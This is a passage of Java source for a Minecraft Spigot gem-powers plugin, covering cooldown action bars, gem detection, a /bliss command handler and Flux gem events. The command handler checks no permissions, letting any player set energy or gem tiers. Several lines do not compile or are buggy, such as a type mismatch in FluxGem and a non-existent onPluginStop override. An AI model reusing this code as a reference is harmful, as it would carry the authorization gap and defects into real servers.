        long PuffGemPower_2 = PuffGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
        long PuffGemPower_3 = PuffGem_Power_3_Dash.getOrDefault(player.getUniqueId(), 0L);
        String PuffGem_Power_1_PuffCircle = formatTime(PuffGemPower_1, ChatColor.WHITE + "☁ ");
        String PuffGem_Power_2_Enchanting = formatTime(PuffGemPower_2, ChatColor.WHITE + "\uD83D\uDD2E ");
        String PuffGem_Power_3_Dash = formatTime(PuffGemPower_3, ChatColor.WHITE + "⏫ ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(PuffGem_Power_1_PuffCircle + " " + PuffGem_Power_2_Enchanting + " " + PuffGem_Power_3_Dash));
    }

    private void AstraGemActionbar(Player player) {
        long AstraGemPower_1 = AstraGem_Power_1_Daggers.getOrDefault(player.getUniqueId(), 0L);
        long AstraGemPower_2 = AstraGem_Power_2_SoulCapture.getOrDefault(player.getUniqueId(), 0L);
        long AstraGemPower_3 = AstraGem_Power_3_AstralProjection.getOrDefault(player.getUniqueId(), 0L);
        long AstraGemPower_4 = AstraGem_Power_4_DimensionalDrift.getOrDefault(player.getUniqueId(), 0L);
        String AstraGem_Power_1_Daggers = formatTime(AstraGemPower_1, ChatColor.WHITE + "\uD83D\uDD2A ");
        String AstraGem_Power_2_SoulCapture = formatTime(AstraGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E ");
        String AstraGem_Power_3_AstralProjection = formatTime(AstraGemPower_3, ChatColor.WHITE + "\uD83D\uDC7B ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(AstraGem_Power_1_Daggers + " " + AstraGem_Power_2_SoulCapture + " " + AstraGem_Power_3_AstralProjection));
    }

    private void FireGemActionbar(Player player) {
        long FireGemPower_1 = FireGem_Power_1_FireBall.getOrDefault(player.getUniqueId(), 0L);
        long FireGemPower_2 = FireGem_Power_2_Enchanting.getOrDefault(player.getUniqueId(), 0L);
        long FireGemPower_3 = FireGem_Power_3_CozyCampfire.getOrDefault(player.getUniqueId(), 0L);
        String FireGem_Power_1_FireBall = formatTime(FireGemPower_1, ChatColor.WHITE + "\uD83E\uDDE8 ");
        String FireGem_Power_2_Enchanting = formatTime(FireGemPower_2, net.md_5.bungee.api.ChatColor.of(new Color(255, 140, 0)) + "\uD83D\uDD2E ");
        String FireGem_Power_3_CozyCampfire = formatTime(FireGemPower_3, ChatColor.WHITE + "\uD83E\uDD7E ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(FireGem_Power_1_FireBall + " " + FireGem_Power_2_Enchanting + " " + FireGem_Power_3_CozyCampfire));
    }

    private void FluxGemActionbar(Player player) {
        long FluxGemPower_1 = FluxGem_Power_2_FluxBurst.getOrDefault(player.getUniqueId(), 0L);
        long FluxGemPower_3 = FluxGem_Power_2_FluxBurst.getOrDefault(player.getUniqueId(), 0L);
        double damageAbsorbed = damageAbsorbedMap.getOrDefault(player.getUniqueId(), 0.0);
        String actionBarMessage = ChatColor.GREEN + "Damage Absorbed: " + (int) damageAbsorbed;
        player.spigot().sendMessage(net.md_5.bungee.api.ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(actionBarMessage));
        String FireGem_Power_1_FireBall = formatTime(FluxGemPower_1, ChatColor.WHITE + "\uD83E\uDDE8 ");
        String FireGem_Power_3_CozyCampfire = formatTime(FluxGemPower_3, ChatColor.WHITE + "\uD83E\uDD7E ");
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(FireGem_Power_1_FireBall + " " + net.md_5.bungee.api.ChatColor.of(new Color(0, 255, 255)) + "🔮 " + ChatColor.AQUA + String.format("%.1f", damageAbsorbed) + " " + FireGem_Power_3_CozyCampfire));
    }


    private void HideActionBar(Player player) {
        player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(""));
    }

    private String formatTime(long time, String prefix) {
        if (time <= 0) {
            return prefix + ChatColor.GREEN + "Ready!";
        }
        long minutes = time / 60;
        long seconds = time % 60;
        String timeString;
        if (minutes > 0 && seconds > 0) {
            timeString = ChatColor.AQUA.toString() + minutes + "m " + seconds + "s";
        } else if (minutes > 0) {
            timeString = ChatColor.AQUA.toString() + minutes + "m";
        } else {
            timeString = ChatColor.AQUA.toString() + seconds + "s";
        }
        return prefix + timeString;
    }

    private boolean StrengthGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴛʀᴇɴɢᴛʜ ɢᴇᴍ");
    }

    private boolean StrengthGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (StrengthGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean SpeedGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴘᴇᴇᴅ ɢᴇᴍ");
    }

    private boolean SpeedGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (SpeedGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean LifeGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ʟɪғᴇ ɢᴇᴍ");
    }

    private boolean LifeGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (LifeGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean WealthGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴡᴇᴀʟᴛʜ ɢᴇᴍ");
    }

    private boolean WealthGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (WealthGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean PuffGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴘᴜғғ ɢᴇᴍ");
    }

    private boolean PuffGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (PuffGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean AstraGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴀsᴛʀᴀ ɢᴇᴍ");
    }

    private boolean AstraGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (AstraGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean FireGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғɪʀᴇ ɢᴇᴍ");
    }

    private boolean FireGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (FireGemDetect(item)) {
                return true;
            }
        }
        return false;
    }

    private boolean FluxGemDetect(ItemStack item) {
        return item != null
                && item.getType() == Material.PRISMARINE_SHARD
                && item.hasItemMeta()
                && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғʟᴜx ɢᴇᴍ");
    }

    private boolean FluxGem(Player player) {
        for (ItemStack item : player.getInventory().getContents()) {
            if (FluxGemDetect(item)) {
                return true;
            }
        }
        return false;
    }


    public class BlissCommandExecutor implements CommandExecutor {

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("This command can only be used by players.");
                return true;
            }

            Player player = (Player) sender;

            if (args.length == 2 && args[0].equalsIgnoreCase("particles") && args[1].equalsIgnoreCase("default")) {
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "\uD83D\uDD2E " + ChatColor.GREEN + "Performance Level changed to " + ChatColor.YELLOW + "DEFAULT");
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.set(BlissParticlesDefault, PersistentDataType.INTEGER, 1);
                data.remove(BlissParticlesLess);
                return true;
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("particles") && args[1].equalsIgnoreCase("less")) {
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "\uD83D\uDD2E " + ChatColor.GREEN + "Performance Level changed to " + ChatColor.YELLOW + "LESS");
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.set(BlissParticlesLess, PersistentDataType.INTEGER, 1);
                data.remove(BlissParticlesDefault);
                return true;
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("particles") && args[1].equalsIgnoreCase("none")) {
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "\uD83D\uDD2E " + ChatColor.GREEN + "Performance Level changed to " + ChatColor.YELLOW + "NONE");
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.remove(BlissParticlesLess);
                data.remove(BlissParticlesDefault);
                return true;
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("0")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 0;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("1")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 3;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("2")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 6;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("3")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 9;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("4")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 12;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("5")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 15;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("6")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 18;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("7")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 21;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("8")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 24;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("9")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 27;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("10")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 30;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }
            if (args.length == 2 && args[0].equalsIgnoreCase("setenergy") && args[1].equalsIgnoreCase("11")) {
                UUID GemHealthUUID = player.getUniqueId();
                int newScore = 33;
                BlissEnergyGemHealth.put(GemHealthUUID, newScore);
                player.sendMessage(ChatColor.GREEN + "Your new score is: " + newScore);
            }


            if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Strength") && args[2].equalsIgnoreCase("1")) {
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.set(ChadStrengthParticleCase3, PersistentDataType.INTEGER, 1);
                data.remove(ChadStrengthParticleCase1);
                data.remove(ChadStrengthParticleCase2);
                data.remove(ChadStrengthParticleCase4);
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have given " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + player.getName() + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + " sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have received " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");

            }
            if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Speed") && args[2].equalsIgnoreCase("1")) {
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.set(ChadStrengthParticleCase2, PersistentDataType.INTEGER, 1);
                data.remove(ChadStrengthParticleCase1);
                data.remove(ChadStrengthParticleCase3);
                data.remove(ChadStrengthParticleCase4);
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have given " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + player.getName() + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + " sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have received " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");

            }
            if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Life") && args[2].equalsIgnoreCase("1")) {
                PersistentDataContainer data = player.getPersistentDataContainer();
                data.set(ChadStrengthParticleCase1, PersistentDataType.INTEGER, 1);
                data.remove(ChadStrengthParticleCase2);
                data.remove(ChadStrengthParticleCase3);
                data.remove(ChadStrengthParticleCase4);

                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have given " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + player.getName() + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + " ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have received " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");

            }
            if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Wealth") && args[2].equalsIgnoreCase("1")) {
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have given " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + player.getName() + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + " ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have received " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
            }
            if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Puff") && args[2].equalsIgnoreCase("1")) {
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have given " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + player.getName() + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + ChatColor.BOLD + " ᴘᴜғғ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
                player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have received " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + ChatColor.BOLD + "ᴘᴜғғ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem " + ChatColor.GRAY + "Tier " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "1");
            }


            //player.sendMessage("You don't have permission to do this");
            return true;
        }
    }

    public class BlissCommandTabCompleter implements TabCompleter {

        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            if (args.length == 1) {
                return Arrays.asList("particles", "setenergy", "withdraw", "gem", "setTier");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("particles")) {
                return Arrays.asList("default", "less", "none");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("setenergy")) {
                return Arrays.asList("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("setTier")) {
                return Arrays.asList("1", "2");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("withdraw")) {
                return Arrays.asList("1");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("gem")) {
                return Arrays.asList("Strength", "Speed", "Life", "Wealth", "Puff", "Astra", "Fire", "Flux");
            } else if (args.length == 3 && args[0].equalsIgnoreCase("gem") && args[1].equalsIgnoreCase("Strength")) {
                return Arrays.asList("(tier)");
            }
            return new ArrayList<>();
        }
    }


    @EventHandler
    public void GemDroppingAttempt(PlayerDropItemEvent GemDropped) {
        Player player = GemDropped.getPlayer();
        ItemStack itemStack = GemDropped.getItemDrop().getItemStack();
        ItemStack item = GemDropped.getItemDrop().getItemStack();

        if (item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta()) {
            if (item.getItemMeta().hasCustomModelData() && item.getItemMeta().getCustomModelData() == 10) {
                GemDropped.setCancelled(true);
                itemStack.setAmount(1);
            }
        }
    }

    @EventHandler
    public void ActionbarCooldowns(PlayerItemHeldEvent event) {
        Player player = event.getPlayer();
        ItemStack newItemMainHand = player.getInventory().getItem(event.getNewSlot());
        ItemStack newItemOffHand = player.getInventory().getItemInOffHand();
        if (StrengthGemDetect(newItemMainHand) || StrengthGemDetect(newItemOffHand)) {
            StrengthGemActionbar(player);
        } else if (SpeedGemDetect(newItemMainHand) || SpeedGemDetect(newItemOffHand)) {
            SpeedGemActionbar(player);
        } else if (LifeGemDetect(newItemMainHand) || LifeGemDetect(newItemOffHand)) {
            LifeGemActionbar(player);
        } else if (WealthGemDetect(newItemMainHand) || WealthGemDetect(newItemOffHand)) {
            WealthGemActionbar(player);
        } else if (PuffGemDetect(newItemMainHand) || PuffGemDetect(newItemOffHand)) {
            PuffGemActionbar(player);
        } else if (FireGemDetect(newItemMainHand) || FireGemDetect(newItemOffHand)) {
            FireGemActionbar(player);
        } else if (FluxGemDetect(newItemMainHand) || FluxGemDetect(newItemOffHand)) {
            FluxGemActionbar(player);
        } else {
            HideActionBar(player);
        }
    }


    @EventHandler
    public void FluxBurstEntityDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            ItemStack FluxGemItem = player.getInventory().getItemInOffHand();
            if (FluxGem(FluxGemItem)) {
                double damage = event.getDamage() / 4.75;
                damageAbsorbedMap.put(player.getUniqueId(), damageAbsorbedMap.getOrDefault(player.getUniqueId(), 0.0) + damage);
            }
        }
    }

    @EventHandler
    public void FluxCircle(PlayerInteractEvent FluxCircle) {
        Player FluxCirclePlayer = FluxCircle.getPlayer();
        ItemStack FluxGemItem = FluxCirclePlayer.getInventory().getItemInOffHand();
        if (FluxCircle.getAction() == Action.RIGHT_CLICK_AIR || FluxCircle.getAction() == Action.RIGHT_CLICK_BLOCK) {
            double absorbedDamage = damageAbsorbedMap.getOrDefault(FluxCirclePlayer.getUniqueId(), 0.0);
            if (absorbedDamage > 0.0) {
                double damageToDeal = absorbedDamage * 3.75;
                ItemMeta meta = FluxGemItem.getItemMeta();
                if (meta != null && meta.hasCustomModelData()) {
                    int CustomModelData = meta.getCustomModelData();
                    int radius = FluxGemCustomModelData(CustomModelData);
                    if (radius > 0) {
                        PersistentDataContainer data = FluxCirclePlayer.getPersistentDataContainer();
                        boolean FLUX_CIRCLE = data.getOrDefault(FʟᴜxCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
                        boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                        if (!FLUX_CIRCLE && !DISABLED_GEM) {
                            data.set(FʟᴜxCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                            FluxCircleRadius(FluxCirclePlayer, radius);
                            Location loc = FluxCirclePlayer.getLocation();
                            PrimaryRGBParticleCircle(loc, 0, 255, 255, radius);
                            for (Entity entity : FluxCirclePlayer.getNearbyEntities(radius, radius, radius)) {
                                if (entity instanceof LivingEntity && !entity.equals(FluxCirclePlayer)) {
                                    ((LivingEntity) entity).damage(damageToDeal, FluxCirclePlayer);
                                }
                            }
                            damageAbsorbedMap.put(FluxCirclePlayer.getUniqueId(), 0.0);
                            FluxGemActionbar(FluxCirclePlayer);
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void FluxGemHaste(BlockBreakEvent event) {
        Player player = event.getPlayer();
        if (FluxGem(player)) {
            UUID playerId = player.getUniqueId();
            minedBlocks.put(playerId, minedBlocks.getOrDefault(playerId, 0) + 1);
            int blocksMined = minedBlocks.get(playerId);
            if (blocksMined % 6 == 0) {
                int hasteLevel = Math.min(blocksMined / 6, 10); // Limit haste level to 10
                giveHasteEffect(player, hasteLevel);
            }
        }
    }

    private void giveHasteEffect(Player player, int level) {
        player.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, 100, level - 1));
        int taskId = hasteTaskIds.remove(player.getUniqueId());
        if (taskId != 0) {
            getServer().getScheduler().cancelTask(taskId);
        }
        taskId = getServer().getScheduler().scheduleSyncDelayedTask(this, () -> {
            player.removePotionEffect(PotionEffectType.FAST_DIGGING);
            minedBlocks.put(player.getUniqueId(), (level - 1) * 4);
        }, 100);
        hasteTaskIds.put(player.getUniqueId(), taskId);
    }


    @Override
    public void onPluginStop() {
        // Plugin shutdown logic
        saveTimers();
        saveInventories();
        EnergySaveScore(dataConfig);
        try {
            dataConfig.save(dataFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void loadTimers() {
        FileConfiguration config = getConfig();
        loadTimerSection(config, "timers.StrengthGem_Power_1_StrengthCircle", StrengthGem_Power_1_StrengthCircle);
        loadTimerSection(config, "timers.StrengthGem_Power_2_Enchanting", StrengthGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.StrengthGem_Power_3_ChadStrength", StrengthGem_Power_3_ChadStrength);
        loadTimerSection(config, "timers.SpeedGem_Power_1_SpeedCircle", SpeedGem_Power_1_SpeedCircle);
        loadTimerSection(config, "timers.SpeedGem_Power_2_Enchanting", SpeedGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.SpeedGem_Power_3_SpeedStormCircle", SpeedGem_Power_3_SpeedStormCircle);
        loadTimerSection(config, "timers.LifeGem_Power_1_LifeCircle", LifeGem_Power_1_LifeCircle);
        loadTimerSection(config, "timers.LifeGem_Power_2_Enchanting", LifeGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.LifeGem_Power_3_CircleOfLife", LifeGem_Power_3_CircleOfLife);
        loadTimerSection(config, "timers.WealthGem_Power_1_WealthCircle", WealthGem_Power_1_WealthCircle);
        loadTimerSection(config, "timers.WealthGem_Power_2_Enchanting", WealthGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.WealthGem_Power_3_RichRush", WealthGem_Power_3_RichRush);
        loadTimerSection(config, "timers.PuffGem_Power_1_PuffCircle", PuffGem_Power_1_PuffCircle);
        loadTimerSection(config, "timers.PuffGem_Power_2_Enchanting", PuffGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.PuffGem_Power_3_Dash", PuffGem_Power_3_Dash);
        loadTimerSection(config, "timers.FireGem_Power_1_FireBall", FireGem_Power_1_FireBall);
        loadTimerSection(config, "timers.FireGem_Power_2_Enchanting", FireGem_Power_2_Enchanting);
        loadTimerSection(config, "timers.FireGem_Power_3_CozyCampfire", FireGem_Power_3_CozyCampfire);
    }


    private void loadTimerSection(FileConfiguration config, String path, Map<UUID, Long> map) {
        if (config.isConfigurationSection(path)) {
            for (String key : config.getConfigurationSection(path).getKeys(false)) {
                UUID playerId = UUID.fromString(key);
                long time = config.getLong(path + "." + key);
                map.put(playerId, time);
            }
        }
    }

    private void saveTimers() {
        FileConfiguration config = getConfig();
        saveTimerSection(config, "timers.StrengthGem_Power_1_StrengthCircle", StrengthGem_Power_1_StrengthCircle);
        saveTimerSection(config, "timers.StrengthGem_Power_2_Enchanting", StrengthGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.StrengthGem_Power_3_ChadStrength", StrengthGem_Power_3_ChadStrength);
        saveTimerSection(config, "timers.SpeedGem_Power_1_SpeedCircle", SpeedGem_Power_1_SpeedCircle);
        saveTimerSection(config, "timers.SpeedGem_Power_2_Enchanting", SpeedGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.SpeedGem_Power_3_SpeedStormCircle", SpeedGem_Power_3_SpeedStormCircle);
        saveTimerSection(config, "timers.LifeGem_Power_1_LifeCircle", LifeGem_Power_1_LifeCircle);
        saveTimerSection(config, "timers.LifeGem_Power_2_Enchanting", LifeGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.LifeGem_Power_3_CircleOfLife", LifeGem_Power_3_CircleOfLife);
        saveTimerSection(config, "timers.WealthGem_Power_1_WealthCircle", WealthGem_Power_1_WealthCircle);
        saveTimerSection(config, "timers.WealthGem_Power_2_Enchanting", WealthGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.WealthGem_Power_3_RichRush", WealthGem_Power_3_RichRush);
        saveTimerSection(config, "timers.PuffGem_Power_1_PuffCircle", PuffGem_Power_1_PuffCircle);
        saveTimerSection(config, "timers.PuffGem_Power_2_Enchanting", PuffGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.PuffGem_Power_3_Dash", PuffGem_Power_3_Dash);
        saveTimerSection(config, "timers.FireGem_Power_1_FireBall", FireGem_Power_1_FireBall);
